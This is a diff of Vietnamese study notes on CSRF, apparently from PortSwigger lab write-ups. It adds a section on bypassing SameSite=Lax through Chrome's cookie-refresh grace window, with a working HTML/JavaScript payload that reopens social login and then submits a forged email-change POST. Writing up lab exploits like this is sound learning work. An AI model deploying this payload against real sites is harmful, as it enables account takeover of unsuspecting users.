@@ -377,6 +377,39 @@ redirectOnConfirmation = (blogPath) => {
 10.0.3.134      2025-06-06 03:47:06 +0000 "GET /exploit{"user":"Hal Pline","content":"No problem carlos, it's re7x1159ugzypdjnrfzt"} HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 ```
 
+### SameSite Lax bypass via cookie refresh
+#### Analysis
+- Chức năng đổi **email (/my-account/change-email)** dùng phương thức **POST**
+- Không có **CSRF token** bảo vệ
+- Cookie được set mà không có SameSite nên **Chrome** mặc định sẽ sử dụng `SameSite=Lax`
+- Để đảm bảo trải nghiệm người dùng và không làm hỏng các hệ thống **SSO (Single Sign-On)** thì trong 120s đầu tiên, **Chrome** tạm thời nới lỏng hạn chế của `SameSite=Lax` tức `SameSite=Lax` chưa bị **enforce**
+=> Lợi dụng điều này để cấp phát lại cookie, tận dụng 120s đó để thực hiện tấn công **CSRF change email** theo method **POST**
+
+#### Exploit
+- Tạo mã khai thác và thêm vào phần body của **Exploit Server** 
+```html
+    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="evil@gmail.com">
+    </form>
+    <script>
+        window.onclick = () => {
+            window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+            setTimeout(changeEmail, 5000);
+        }
+
+        function changeEmail() {
+            document.forms[0].submit();
+        }
+    </script>
+```
+
+- Deliver to victim
+- Dựa vào sự kiện onclick để mở popup, bởi vì các trình duyệt hiện đại chặn tự động mở popup, nếu có sự tương tác của người dùng thì nó là hợp lệ
+- `setTimeout(changeEmail, 5000);` để đảm bảo **cookie** được cấp phát mới
+- Khi open `/social-login`, **cookie** được cấp phát m
+ới nhưng không thoát phiên đăng nhập
+- Sau 5s gửi **POST** để thực hiện việc thay đổi email
+
 ## Prevent
 ---
 Hiện nay, để khai thác thành công một lỗ hổng **CSRF**, kẻ tấn công thường phải vượt qua các biện pháp phòng vệ được triển khai bởi website mục tiêu, trình duyệt của nạn nhân, hoặc cả hai.
@@ -400,4 +433,4 @@ Hiện nay, để khai thác thành công một lỗ hổng **CSRF**, kẻ tấn
     - Không phải lúc nào cũng đáng tin cậy và dễ bị bỏ qua, vì vậy không nên dùng làm biện pháp duy nhất.
 
 ---
-Goodluck! 🍀🍀🍀
+Goodluck! 🍀🍀🍀 
